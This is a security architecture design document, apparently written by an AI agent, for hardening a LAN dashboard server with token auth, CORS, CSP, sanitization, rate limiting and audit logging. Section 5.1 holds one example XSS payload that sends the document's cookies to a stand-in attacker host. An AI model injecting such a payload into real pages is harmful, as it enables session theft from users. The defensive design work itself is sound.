# VentureOS Phase 5 — Security Architecture

**Author:** Sentinel  
**Date:** 2026-02-14  
**Status:** Design Complete — Ready for Implementation  
**Audience:** Atlas (implementor), Verifier (auditor), Oracle (approver)

---

## Executive Summary

Phase 4 Track 6 deployed a dashboard server at `http://192.168.225.149:7001` with **zero authentication, wildcard CORS, no CSP headers, and raw DB text piped to the DOM**. The Phase 5 tactical map will inherit these vulnerabilities unless addressed before implementation begins.

This document defines the complete security architecture for Phase 5. It addresses **3 P0 issues** (authentication, session exposure, XSS) and **5 P1 issues** (CORS, CSP, rate limiting, audit logging, input sanitization) identified during the pre-implementation security review.

### P0 Issues (Must fix before any Phase 5 deployment)

| ID | Issue | Section |
|----|-------|---------|
| P0-1 | No API authentication — all endpoints at port 7001 are wide open | §1 |
| P0-2 | Isolated session exposure — `sessions_list(kinds=["isolated"])` leaks private work | §2 |
| P0-3 | XSS via task descriptions — unsanitized DB text → DOM in panels/tooltips | §5 |

### P1 Issues (Must fix during Phase 5 implementation)

| ID | Issue | Section |
|----|-------|---------|
| P1-1 | CORS set to `Access-Control-Allow-Origin: *` on every response | §3 |
| P1-2 | No Content Security Policy headers | §4 |
| P1-3 | No rate limiting on any API endpoint | §6 |
| P1-4 | No audit logging for sensitive data access | §7 |
| P1-5 | No server-side input length caps on DB-sourced text | §5 |

---

## 1. Authentication Model

### Decision: **Option B — Pre-Shared API Key (Bearer Token)**

**Rationale:**

OpenClaw does not expose a session management API or cookie infrastructure that the dashboard server can hook into. The dashboard is a standalone Node.js HTTP server (`ventureos/dashboard/server/server.ts`) using raw `http.createServer()` — no Express, no session middleware, no cookie parser. Building session management from scratch would be over-engineered for a single-user system on a private LAN.

A pre-shared API key is the right choice because:

1. **Single-user system** — Zach is the only consumer. No user registration, no multi-tenant concerns.
2. **LAN-only deployment** — The dashboard binds to `192.168.225.149:7001` on a private network. The threat model is unauthorized LAN devices or accidental exposure, not internet-scale attacks.
3. **Zero dependencies** — No need for session stores, cookie parsers, or OAuth libraries.
4. **Programmatic-friendly** — Works identically for browser requests (via `fetch` headers) and CLI/script access.

### 1.1 Token Issuance

**Method:** Generate a cryptographically random 256-bit token at first startup.

```javascript
// In server.js startup
const crypto = require('crypto');
const fs = require('fs');

const TOKEN_PATH = path.join(dataDir, '.api-token');

function getOrCreateToken() {
  if (fs.existsSync(TOKEN_PATH)) {
    return fs.readFileSync(TOKEN_PATH, 'utf8').trim();
  }
  const token = crypto.randomBytes(32).toString('hex');
  fs.writeFileSync(TOKEN_PATH, token, { mode: 0o600 });
  console.log(`[auth] API token generated. Store securely.`);
  console.log(`[auth] Token: ${token.substring(0, 8)}...`);
  return token;
}

const API_TOKEN = process.env.DASHBOARD_API_TOKEN || getOrCreateToken();
```

**File location:** `ventureos/dashboard/data/.api-token`  
**Permissions:** `0600` (owner read/write only)  
**Environment override:** `DASHBOARD_API_TOKEN` env var takes precedence (for testing/rotation).

### 1.2 Token Validation

**Where:** Middleware function called at the top of the request handler, before any route logic.

```javascript
function authenticate(req, res) {
  // Allow CORS preflight without auth
  if (req.method === 'OPTIONS') return true;
  
  // Check Authorization header first
  const authHeader = req.headers['authorization'] || '';
  if (authHeader.startsWith('Bearer ')) {
    const token = authHeader.slice(7);
    if (crypto.timingSafeEqual(Buffer.from(token), Buffer.from(API_TOKEN))) {
      return true;
    }
  }
  
  // Check query param fallback (for EventSource/SSE which can't set headers)
  const url = new URL(req.url, 'http://localhost');
  const queryToken = url.searchParams.get('token');
  if (queryToken && crypto.timingSafeEqual(
    Buffer.from(queryToken), Buffer.from(API_TOKEN)
  )) {
    return true;
  }
  
  // Static assets (HTML, CSS, JS, images) served without auth
  // Auth is enforced on /api/* routes only
  if (!req.url.startsWith('/api/')) return true;
  
  // Reject
  res.writeHead(401, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ ok: false, error: 'Unauthorized' }));
  return false;
}
```

**Key implementation details:**

- **`crypto.timingSafeEqual()`** prevents timing attacks on token comparison.
- **Static assets bypass auth** — The HTML/CSS/JS files are not sensitive; the data comes from API calls. The UI itself handles storing and sending the token.
- **Query param fallback** — Required for `EventSource` (SSE live feed at `/api/live`) which cannot set custom headers. The token in the URL is acceptable because: (a) no proxy logs on a local LAN, (b) HTTPS is not in scope for LAN-only deployment.
- **OPTIONS preflight** always passes — CORS preflight must succeed before the browser sends the real request with the Authorization header.

### 1.3 Client-Side Token Storage

The dashboard UI stores the token in `localStorage` and includes it on every API request:

```javascript
// On first load, prompt for token if not stored
function getApiToken() {
  let token = localStorage.getItem('dashboard_api_token');
  if (!token) {
    token = prompt('Enter API token:');
    if (token) localStorage.setItem('dashboard_api_token', token);
  }
  return token;
}

// Wrap fetch to include auth
async function apiFetch(url, options = {}) {
  const token = getApiToken();
  const headers = { ...(options.headers || {}), 'Authorization': `Bearer ${token}` };
  const res = await fetch(url, { ...options, headers });
  if (res.status === 401) {
    localStorage.removeItem('dashboard_api_token');
    location.reload(); // Re-prompt
  }
  return res;
}
```

**Why `localStorage` not cookies:**
- No session management server-side to set/validate cookies
- `localStorage` is origin-scoped and not sent automatically (prevents CSRF)
- Simple to implement, simple to debug

### 1.4 Token Lifetime & Rotation

| Property | Value |
|----------|-------|
| Token lifetime | Indefinite (until manually rotated) |
| Rotation method | Delete `data/.api-token` and restart server |
| Rotation script | `scripts/rotate-dashboard-token.sh` |
| Environment override | Set `DASHBOARD_API_TOKEN` env var |

**Rotation script:**

```bash
#!/bin/bash
# scripts/rotate-dashboard-token.sh
TOKEN_FILE="$VENTUREOS_ROOT/dashboard/data/.api-token"
rm -f "$TOKEN_FILE"
echo "[rotate] Old token deleted. Restart dashboard to generate new token."
echo "[rotate] Run: launchctl kickstart -k gui/$(id -u)/com.openclaw.dashboard"
```

**Justification for indefinite lifetime:**
Single-user LAN system. Time-based rotation adds complexity without meaningful security gain. Manual rotation on suspicion of compromise is sufficient.

### 1.5 Logout / Revocation

- **Client-side:** `localStorage.removeItem('dashboard_api_token')` + reload
- **Server-side:** Delete token file + restart → all existing tokens are immediately invalid
- **No token blacklist needed** — there's only one valid token at a time

### 1.6 Fallback if Auth Unavailable

If the token file is missing or unreadable and no `DASHBOARD_API_TOKEN` env var is set:

1. Server generates a new token and writes it to disk
2. Server logs the token to stdout (visible in launchd logs)
3. All API requests are rejected until the user retrieves the token from logs

**The server never falls back to unauthenticated mode.** If token generation fails (e.g., disk full), the server refuses to start.

---

## 2. Data Classification & Visibility

### 2.1 Classification Tiers

| Tier | Definition | Who Can See |
|------|-----------|-------------|
| **Public** | Non-sensitive operational data visible to any authenticated user | Any valid token holder |
| **Internal** | Sensitive operational data that provides strategic insight | Any valid token holder (single-user system, so same as Public in practice) |
| **Confidential** | Data that must never appear in API responses or UI | Nobody via the tactical map |

> **Note:** In the current single-user deployment, Public and Internal are functionally equivalent (Zach sees everything). The distinction exists for future multi-user scenarios and to establish the principle that **some data should never leave the server**.

### 2.2 Per-Endpoint Classification

| Endpoint | Data Classification | Visibility Rules |
|----------|-------------------|------------------|
| `GET /` | N/A (static HTML) | No auth required |
| `GET /api/sessions` | **Public**: session count, agent names, status, model, timestamps | ✅ Expose |
| | **Confidential**: `lastMessage` content from isolated sessions | ❌ Redact — see §2.3 |
| `GET /api/ventureos-agents` | **Public**: agent names, status (idle/working), session counts | ✅ Expose |
| | **Internal**: success rates, latency, recent session labels | ✅ Expose (authenticated) |
| | **Confidential**: `lastMessage` content from isolated sessions, full session keys | ❌ Redact |
| `GET /api/ventureos-kpis` | **Internal**: KPI values, trends, SLO status | ✅ Expose (authenticated) |
| `GET /api/rpg/stats` | **Internal**: performance stats per agent | ✅ Expose (authenticated) |
| `GET /api/rpg/affinity-network` | **Internal**: bond affinities, drift history | ✅ Expose (authenticated) |
| `GET /api/rpg/conversations/*` | **Internal**: conversation titles, participants, message text | ✅ Expose (authenticated) |
| `GET /api/costs` | **Internal**: cost data per model, per session | ✅ Expose (authenticated) |
| `GET /api/usage-windows` | **Internal**: token usage, burn rates | ✅ Expose (authenticated) |
| `GET /api/system` | **Public**: CPU, memory, disk, uptime | ✅ Expose (authenticated) |
| `GET /api/live` (SSE) | **Internal**: real-time message stream | ✅ Expose (authenticated) |
| `GET /api/replay/*` (Phase 5.6) | **Internal**: historical session replay | ✅ Expose (authenticated) + **audit logged** |

### 2.3 Session Visibility Filtering (P0-2 Fix)

**The problem:** `getSessionsJson()` in `server.js` reads `sessions.json` and returns `lastMessage` for every session, including isolated/subagent sessions. The `lastMessage` field contains the first 80 characters of the most recent user or assistant message — which could be a private task description like "Research competitor pricing for Project X".

**The rule:**

> **Isolated session labels and message content are Confidential.**  
> The tactical map shows **"Oracle: Active (3 tasks)"** — never **"Oracle: Researching Phase 5 spec"**.

**Implementation — Server-side filtering in `getSessionsJson()`:**

```javascript
function getSessionsJson({ redactIsolated = true } = {}) {
  try {
    const sFile = path.join(sessDir, 'sessions.json');
    const data = JSON.parse(fs.readFileSync(sFile, 'utf8'));
    return Object.entries(data).map(([key, s]) => {
      const kind = s.kind || (key.includes('group') ? 'group' : 'direct');
      const isIsolated = kind === 'isolated' || key.includes('subagent');
      
      return {
        key: redactIsolated && isIsolated ? '[redacted]' : key,
        label: redactIsolated && isIsolated 
          ? `Task ${hashShort(s.sessionId || key)}` 
          : (s.label || resolveName(key)),
        model: s.modelOverride || s.model || '-',
        totalTokens: s.totalTokens || 0,
        contextTokens: s.contextTokens || 0,
        kind,
        updatedAt: s.updatedAt || 0,
        createdAt: s.createdAt || s.updatedAt || 0,
        aborted: s.abortedLastRun || false,
        thinkingLevel: s.thinkingLevel || null,
        channel: s.channel || '-',
        sessionId: s.sessionId || '-',
        // CRITICAL: Never expose lastMessage for isolated sessions
        lastMessage: redactIsolated && isIsolated ? '' : getLastMessage(s.sessionId || key),
        cost: getSessionCost(s.sessionId || key)
      };
    });
  } catch (e) { return []; }
}

function hashShort(input) {
  return crypto.createHash('sha256')
    .update(String(input))
    .digest('hex')
    .substring(0, 6);
}
```

**Apply the same filtering in `getVentureosAgents()`:**

```javascript
// In getAgentSessionsIndex(), redact isolated session details
function getAgentSessionsIndex(agentId, { redactIsolated = true } = {}) {
  // ... existing code ...
  return Object.entries(data || {}).map(([key, s]) => {
    const isIsolated = key.includes('subagent') || key.includes('isolated');
    const sid = s.sessionId || key;
    return {
      agentId,
      key: redactIsolated && isIsolated ? '[redacted]' : key,
      sessionId: sid,
      label: redactIsolated && isIsolated 
        ? `Task ${hashShort(sid)}` 
        : (s.label || resolveName(key)),
      updatedAt: s.updatedAt || 0,
      createdAt: s.createdAt || s.updatedAt || 0,
      aborted: s.abortedLastRun || false,
      model: s.modelOverride || s.model || '-',
      lastMessage: redactIsolated && isIsolated ? '' : getLastMessageFromDir(agentSessDir, sid)
    };
  });
}
```

**What the tactical map sees:**

```json
{
  "agentId": "oracle",
  "status": "working",
  "sessionCount": 5,
  "recentSessions": [
    { "label": "Task a3f2c1", "aborted": false, "lastMessage": "" },
    { "label": "discord-main", "aborted": false, "lastMessage": "Phase 5 review complete..." }
  ]
}
```

### 2.4 Data That Must Never Appear in API Responses

The following data must **never** be included in any API response, regardless of authentication:

| Data | Why | Where It Currently Leaks |
|------|-----|-------------------------|
| Full session keys (e.g., `agent:oracle:subagent:uuid`) | Contains internal routing info | `getSessionsJson()` → `key` field |
| `lastMessage` of isolated/subagent sessions | Contains private task content | `getSessionsJson()`, `getVentureosAgents()` |
| `.api-token` file contents | Auth credential | N/A (new file, ensure not served as static) |
| `MEMORY.md` content | Personal context | Not currently exposed (keep it that way) |
| Error stack traces | Reveals internal paths | `sendJson()` in error handlers — see §2.5 |

### 2.5 Error Response Sanitization

Current error handlers in `rpg-http.js` and `conversation-http.js` expose `e.message` directly:

```javascript
// CURRENT (unsafe)
sendJson(res, { ok: false, error: 'Internal error', details: String(e?.message || e) }, 500);
```

**Fix:**

```javascript
// FIXED
function safeError(e) {
  console.error('[api] Internal error:', e); // Full error to server logs
  return { ok: false, error: 'Internal server error' }; // Generic to client
}
```

In development mode (controlled by `DASHBOARD_DEBUG=1` env var), error details may be included. In production (default), only generic error messages are returned.

---

## 3. CORS Policy

### Current State (Broken)

Every `sendJson()` call in the codebase sets:

```javascript
'Access-Control-Allow-Origin': '*'
```

This appears in **three places**:
1. `server.js` — `sendJson()` function (line ~64)
2. `rpg-http.js` — `sendJson()` function  
3. `conversation-http.js` — `sendJson()` function

### Required State

**Strict origin whitelist — no wildcards, no dynamic origins:**

```javascript
const ALLOWED_ORIGINS = new Set([
  'http://192.168.225.149:7001',
  'http://192.168.225.149:7000',
  'http://localhost:7001',
  'http://localhost:7000',
]);

function setCorsHeaders(req, res) {
  const origin = req.headers['origin'] || '';
  if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  // If origin not in whitelist, don't set any CORS header (browser blocks the request)
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
}
```

### Implementation

Replace all three `sendJson()` functions to use a shared CORS setter. Best approach: create a shared middleware module.

**File:** `ventureos/dashboard/server/middleware/cors.ts`

```javascript
const ALLOWED_ORIGINS = new Set([
  'http://192.168.225.149:7001',
  'http://192.168.225.149:7000',
  'http://localhost:7001',
  'http://localhost:7000',
]);

function applyCors(req, res) {
  const origin = req.headers['origin'] || '';
  if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
}

function handlePreflight(req, res) {
  if (req.method !== 'OPTIONS') return false;
  applyCors(req, res);
  res.writeHead(204);
  res.end();
  return true;
}

module.exports = { applyCors, handlePreflight, ALLOWED_ORIGINS };
```

**Changes required in existing files:**

| File | Change |
|------|--------|
| `server.js` | Import `cors.js`, call `applyCors(req, res)` at top of request handler, remove `'Access-Control-Allow-Origin': '*'` from `sendJson()` |
| `rpg-http.js` | Import `cors.js`, call `applyCors(req, res)` at entry of `handleRpgApi()`, remove hardcoded CORS headers from `sendJson()` and `handleOptions()` |
| `conversation-http.js` | Import `cors.js`, call `applyCors(req, res)` at entry of `handleConversationApi()`, remove hardcoded CORS headers from `sendJson()` |

---

## 4. Content Security Policy (CSP)

### Headers

```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';

X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 0
Referrer-Policy: strict-origin-when-cross-origin
```

### Directive Rationale

| Directive | Value | Why |
|-----------|-------|-----|
| `default-src 'self'` | Baseline: only load resources from same origin | Blocks all external resource loading |
| `script-src 'self'` | Only execute scripts served by the dashboard | Blocks injected `<script>` tags (XSS mitigation) |
| `style-src 'self' 'unsafe-inline'` | Allow inline styles | Dashboard uses inline styles extensively; refactoring to external CSS is out of scope |
| `img-src 'self' data:` | Allow data: URIs for images | Dashboard may use inline SVGs or data URI icons |
| `connect-src 'self'` | Only allow XHR/fetch/WebSocket to same origin | Prevents exfiltration of data to external servers |
| `frame-ancestors 'none'` | Prevent embedding in iframes | Blocks clickjacking attacks |
| `object-src 'none'` | Block plugins (Flash, Java, etc.) | No legitimate use case |
| `base-uri 'self'` | Prevent `<base>` tag injection | Blocks a subtle XSS variant |

### Implementation

**File:** `ventureos/dashboard/server/middleware/security-headers.ts`

```javascript
const CSP_DIRECTIVES = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data:",
  "font-src 'self'",
  "connect-src 'self'",
  "frame-ancestors 'none'",
  "object-src 'none'",
  "base-uri 'self'",
].join('; ');

function applySecurityHeaders(res) {
  res.setHeader('Content-Security-Policy', CSP_DIRECTIVES);
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '0'); // Disabled; CSP is the real protection
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
}

module.exports = { applySecurityHeaders, CSP_DIRECTIVES };
```

**Call `applySecurityHeaders(res)` at the top of every request handler in `server.js`**, before any response is sent.

### CSP for DOMPurify

If DOMPurify is loaded from a CDN (not recommended), add the CDN to `script-src`. Better: bundle DOMPurify locally and serve from `'self'`.

---

## 5. Input Sanitization (P0-3 Fix)

### 5.1 The Problem

The dashboard renders DB-sourced text directly into the DOM. Current code in `server.js` does things like:

```javascript
lastMessage: getLastMessage(s.sessionId || key)  // Raw text from JSONL files
label: s.label || resolveName(key)                // Raw text from sessions.json
```

The client-side code (in `index.html`) renders these values using `innerHTML` or text interpolation in template literals that are assigned to `innerHTML`. If any of these values contain `<script>` tags or event handlers (`<img onerror="...">`), they execute in the browser.

**Attack vector example:**
1. An agent creates a session with label: `<img src=x onerror="fetch('http://evil.com/steal?cookie='+document.cookie)">`
2. Dashboard renders the label in a tooltip or panel
3. XSS executes in Zach's browser

### 5.2 Defense-in-Depth Strategy

XSS defense requires **both** client-side and server-side measures:

| Layer | Mechanism | What It Catches |
|-------|-----------|-----------------|
| **Server-side** | Length caps + character stripping | Truncates payloads, removes control chars |
| **Client-side** | DOMPurify sanitization | Removes all HTML/script injection |
| **CSP headers** | `script-src 'self'` | Blocks execution even if injection succeeds |

### 5.3 Server-Side Sanitization

**Add to `server.js`:**

```javascript
// Server-side text sanitization for API responses
function sanitizeText(text, maxLength = 200) {
  if (typeof text !== 'string') return '';
  return text
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '') // Strip control chars (keep \n, \r, \t)
    .replace(/<[^>]*>/g, '')                                // Strip HTML tags
    .trim()
    .substring(0, maxLength);
}

// Length caps per field type
const FIELD_LIMITS = {
  label:        200,
  lastMessage:  200,
  description:  1000,
  agentName:    50,
  errorMessage: 200,
  tooltipText:  500,
};
```

**Apply `sanitizeText()` to every text field in API responses:**

```javascript
// In getSessionsJson()
label: sanitizeText(s.label || resolveName(key), FIELD_LIMITS.label),
lastMessage: sanitizeText(getLastMessage(s.sessionId || key), FIELD_LIMITS.lastMessage),

// In getVentureosAgents() → recentSessions
label: sanitizeText(s.label, FIELD_LIMITS.label),
lastMessage: sanitizeText(s.lastMessage, FIELD_LIMITS.lastMessage),

// In getVentureosAgents() → recentCompletions
label: sanitizeText(s.label, FIELD_LIMITS.label),
summary: sanitizeText(s.lastMessage, FIELD_LIMITS.lastMessage),

// In RPG conversation messages
text: sanitizeText(m.text, FIELD_LIMITS.description),
```

### 5.4 Client-Side Sanitization (DOMPurify)

**Install DOMPurify locally** (do NOT use CDN — violates CSP):

```bash
cd ~/clawd/ventureos/dashboard
npm install dompurify
# Or download the UMD bundle directly:
curl -o public/vendor/purify.min.js https://cdn.jsdelivr.net/npm/dompurify@3.1.7/dist/purify.min.js
```

**Usage in `index.html`:**

```html
<script src="/vendor/purify.min.js"></script>
<script>
// Safe text rendering helper
function safeText(text) {
  return DOMPurify.sanitize(text, { ALLOWED_TAGS: [], ALLOWED_ATTR: [] });
}

// Safe HTML rendering helper (for formatted content)
function safeHtml(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'code', 'br', 'span'],
    ALLOWED_ATTR: ['class'],
  });
}

// BEFORE (unsafe):
// element.innerHTML = `<span>${data.label}</span>`;
// AFTER (safe):
// element.innerHTML = `<span>${safeText(data.label)}</span>`;
// Or even better:
// element.textContent = data.label; // No HTML parsing at all
</script>
```

### 5.5 Preferred Rendering Strategy

**Use `textContent` instead of `innerHTML` wherever possible.** This is the strongest XSS defense because the browser never parses the content as HTML:

```javascript
// BEST: No HTML parsing
tooltipEl.textContent = data.label;

// GOOD: DOMPurify for cases where HTML formatting is needed
panelEl.innerHTML = safeHtml(data.description);

// BAD: Never do this
panelEl.innerHTML = data.label;  // XSS vector
```

### 5.6 Fields Requiring Sanitization

Every field that originates from the database or filesystem and renders in the DOM:

| Field | Source | Server-Side Cap | Client-Side |
|-------|--------|----------------|-------------|
| Session label | `sessions.json` → `label` | 200 chars | `textContent` |
| Last message | JSONL files → message content | 200 chars | `textContent` |
| Agent name | Config / `VENTUREOS_AGENTS` | 50 chars | `textContent` |
| Cron job name | `jobs.json` → `name` | 200 chars | `textContent` |
| KPI values | KPI JSON files | 200 chars | `textContent` |
| Conversation title | SQLite `conversations.title` | 200 chars | `textContent` |
| Conversation message text | SQLite `conversation_messages.text` | 1000 chars | `safeHtml()` |
| Error messages | Various | 200 chars | `textContent` |
| Tooltip content | Computed from above fields | 500 chars | `safeText()` |
| Observation snippets | Markdown files | 220 chars (existing) | `safeText()` |
| Git commit messages | `git log` output | 200 chars | `textContent` |
| Mission descriptions | Phase 5 tactical map | 1000 chars | `safeHtml()` |

---

## 6. Rate Limiting

### 6.1 Design

Rate limiting prevents abuse (intentional or accidental) of expensive endpoints. Since this is a single-user system, rate limits are generous but provide a safety net against:
- Runaway polling loops in the UI
- Accidental `curl` loops
- Compromised API token being used for data exfiltration

### 6.2 Per-Endpoint Limits

| Endpoint Pattern | Limit | Window | Rationale |
|-----------------|-------|--------|-----------|
| `GET /api/sessions` | 20 req/min | Sliding 60s | Moderate — polled by UI |
| `GET /api/ventureos-agents` | 20 req/min | Sliding 60s | Moderate — polled by UI |
| `GET /api/ventureos-kpis` | 10 req/min | Sliding 60s | Light — data changes slowly |
| `GET /api/rpg/stats` | 10 req/min | Sliding 60s | Light |
| `GET /api/rpg/affinity-network` | 10 req/min | Sliding 60s | Expensive (360ms currently) |
| `GET /api/rpg/conversations/*` | 15 req/min | Sliding 60s | Moderate |
| `GET /api/costs` | 10 req/min | Sliding 60s | Expensive (reads all JSONL) |
| `GET /api/usage-windows` | 10 req/min | Sliding 60s | Expensive |
| `GET /api/system` | 20 req/min | Sliding 60s | Cheap but no reason to hammer |
| `GET /api/live` (SSE) | 2 connections | Concurrent | SSE is long-lived |
| `GET /api/replay/*` | 5 req/min | Sliding 60s | Very expensive + audit logged |
| `POST /api/rpg/conversations/*` | 10 req/min | Sliding 60s | Write operations |

### 6.3 Implementation

**File:** `ventureos/dashboard/server/middleware/rate-limit.ts`

```javascript
// Simple in-memory sliding window rate limiter
// No Redis needed for single-user LAN deployment
class RateLimiter {
  constructor() {
    this.windows = new Map(); // key -> [timestamps]
  }

  check(key, limit, windowMs = 60000) {
    const now = Date.now();
    const cutoff = now - windowMs;
    
    let timestamps = this.windows.get(key) || [];
    timestamps = timestamps.filter(t => t > cutoff);
    
    if (timestamps.length >= limit) {
      this.windows.set(key, timestamps);
      return {
        allowed: false,
        remaining: 0,
        resetMs: timestamps[0] + windowMs - now,
      };
    }
    
    timestamps.push(now);
    this.windows.set(key, timestamps);
    
    return {
      allowed: true,
      remaining: limit - timestamps.length,
      resetMs: windowMs,
    };
  }

  // Periodic cleanup (call every 5 minutes)
  cleanup() {
    const now = Date.now();
    for (const [key, timestamps] of this.windows) {
      const active = timestamps.filter(t => now - t < 120000);
      if (active.length === 0) {
        this.windows.delete(key);
      } else {
        this.windows.set(key, active);
      }
    }
  }
}

const limiter = new RateLimiter();
setInterval(() => limiter.cleanup(), 300000);

const LIMITS = {
  '/api/sessions':            { limit: 20, windowMs: 60000 },
  '/api/ventureos-agents':    { limit: 20, windowMs: 60000 },
  '/api/ventureos-kpis':      { limit: 10, windowMs: 60000 },
  '/api/rpg/stats':           { limit: 10, windowMs: 60000 },
  '/api/rpg/affinity-network':   { limit: 10, windowMs: 60000 },
  '/api/rpg/conversations':   { limit: 15, windowMs: 60000 },
  '/api/costs':               { limit: 10, windowMs: 60000 },
  '/api/usage-windows':       { limit: 10, windowMs: 60000 },
  '/api/system':              { limit: 20, windowMs: 60000 },
  '/api/replay':              { limit:  5, windowMs: 60000 },
};

function rateLimit(req, res) {
  if (!req.url || !req.url.startsWith('/api/')) return true;
  
  const pathname = new URL(req.url, 'http://localhost').pathname;
  
  // Find matching limit (longest prefix match)
  let matchedKey = null;
  let matchedConfig = null;
  for (const [prefix, config] of Object.entries(LIMITS)) {
    if (pathname.startsWith(prefix)) {
      if (!matchedKey || prefix.length > matchedKey.length) {
        matchedKey = prefix;
        matchedConfig = config;
      }
    }
  }
  
  if (!matchedConfig) return true; // No limit configured
  
  // Use token + pathname as the rate limit key (single-user, so just pathname)
  const result = limiter.check(matchedKey, matchedConfig.limit, matchedConfig.windowMs);
  
  res.setHeader('X-RateLimit-Limit', matchedConfig.limit);
  res.setHeader('X-RateLimit-Remaining', result.remaining);
  res.setHeader('X-RateLimit-Reset', Math.ceil(result.resetMs / 1000));
  
  if (!result.allowed) {
    res.writeHead(429, { 'Content-Type': 'application/json', 'Retry-After': Math.ceil(result.resetMs / 1000) });
    res.end(JSON.stringify({ ok: false, error: 'Rate limit exceeded', retryAfterMs: result.resetMs }));
    return false;
  }
  
  return true;
}

module.exports = { rateLimit, limiter, LIMITS };
```

### 6.4 Polling Interval Enforcement

The client-side polling interval should be at least **15 seconds** for status endpoints and **30 seconds** for expensive endpoints. The rate limits above enforce this: at 20 req/min for status endpoints, the minimum sustainable interval is 3 seconds (plenty of headroom for 15s polling).

**Client-side enforcement:**

```javascript
const POLL_INTERVALS = {
  sessions: 15000,      // 15s
  agents: 15000,        // 15s
  kpis: 30000,          // 30s
  system: 30000,        // 30s
  affinityNetwork: 60000,  // 60s (expensive)
  costs: 60000,         // 60s (expensive)
};
```

---

## 7. Audit Logging

### 7.1 What to Log

| Event Type | Trigger | Severity |
|-----------|---------|----------|
| `auth_success` | Valid token on API request | info |
| `auth_failure` | Invalid/missing token on API request | warn |
| `rate_limit_hit` | 429 response sent | warn |
| `replay_access` | Any request to `/api/replay/*` | info |
| `session_enumeration` | >5 requests to `/api/sessions` within 30s | warn |
| `server_start` | Dashboard process starts | info |
| `token_rotation` | API token file regenerated | warn |
| `error_500` | Internal server error on any API route | error |

### 7.2 Log Format

**File:** `~/clawd/logs/tactical-map-access.log`  
**Format:** JSON Lines (one JSON object per line)  
**Rotation:** Daily, keep 30 days

```json
{
  "ts": "2026-02-14T17:45:00.000Z",
  "event": "auth_failure",
  "ip": "192.168.225.42",
  "method": "GET",
  "path": "/api/sessions",
  "userAgent": "Mozilla/5.0...",
  "detail": "Missing Authorization header"
}
```

### 7.3 Implementation

**File:** `ventureos/dashboard/server/middleware/audit-log.ts`

```javascript
const fs = require('fs');
const path = require('path');
const os = require('os');

const LOG_DIR = path.join(os.homedir(), 'clawd', 'logs');
const LOG_FILE = path.join(LOG_DIR, 'tactical-map-access.log');

// Ensure log directory exists
try { fs.mkdirSync(LOG_DIR, { recursive: true }); } catch {}

// Buffered writes for performance
let _buffer = [];
let _flushTimer = null;

function auditLog(event, req, detail = {}) {
  const entry = {
    ts: new Date().toISOString(),
    event,
    ip: req ? (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown') : 'internal',
    method: req?.method || '-',
    path: req?.url || '-',
    userAgent: req?.headers?.['user-agent']?.substring(0, 200) || '-',
    ...detail,
  };

  _buffer.push(JSON.stringify(entry));

  // Flush buffer every 5 seconds or when buffer exceeds 50 entries
  if (!_flushTimer) {
    _flushTimer = setTimeout(flush, 5000);
  }
  if (_buffer.length >= 50) {
    flush();
  }
}

function flush() {
  if (_flushTimer) {
    clearTimeout(_flushTimer);
    _flushTimer = null;
  }
  if (_buffer.length === 0) return;

  const lines = _buffer.join('\n') + '\n';
  _buffer = [];

  fs.appendFile(LOG_FILE, lines, (err) => {
    if (err) console.error('[audit] Write failed:', err.message);
  });
}

// Flush on process exit
process.on('exit', flush);
process.on('SIGTERM', () => { flush(); process.exit(0); });
process.on('SIGINT', () => { flush(); process.exit(0); });

module.exports = { auditLog, flush };
```

### 7.4 Replay Endpoint Audit (Phase 5.6)

Every request to `/api/replay/*` must be audit logged with the requested timestamp range:

```javascript
// In the replay route handler
auditLog('replay_access', req, {
  sessionId: params.sessionId,
  fromTs: params.from,
  toTs: params.to,
  resultCount: results.length,
});
```

### 7.5 Brute-Force Detection

Track auth failures per IP. If >10 failures in 5 minutes, log a `brute_force_suspected` event and temporarily block the IP for 15 minutes:

```javascript
const authFailures = new Map(); // ip -> [timestamps]

function trackAuthFailure(ip) {
  const now = Date.now();
  const window = 5 * 60 * 1000; // 5 minutes
  let timestamps = authFailures.get(ip) || [];
  timestamps = timestamps.filter(t => now - t < window);
  timestamps.push(now);
  authFailures.set(ip, timestamps);
  
  if (timestamps.length > 10) {
    auditLog('brute_force_suspected', null, { ip, attempts: timestamps.length });
    return true; // Block this IP
  }
  return false;
}
```

---

## 8. SQL Injection Prevention (Phase 5.6)

### Current State

The existing `conversation-http.js` uses **parameterized queries** correctly:

```javascript
db.prepare(`SELECT * FROM conversations WHERE id = ?`).get(convId); // ✅ Safe
```

The existing `rpg-service.js` uses `sqlite-cli.js` which spawns CLI processes — the queries are constructed as strings. This is being migrated to `better-sqlite3` in Phase 5 (P2 from Track 6 report).

### Rules for All New Code

1. **Always use parameterized queries** — `db.prepare('SELECT * FROM t WHERE id = ?').get(id)`
2. **Never interpolate variables into SQL strings** — No `db.exec(\`SELECT * FROM t WHERE id = '${id}'\`)`
3. **Validate query parameters** — Agent names must match `/^[a-z][a-z0-9\-_]{0,49}$/`, IDs must match `/^[a-z0-9\-]{1,100}$/`
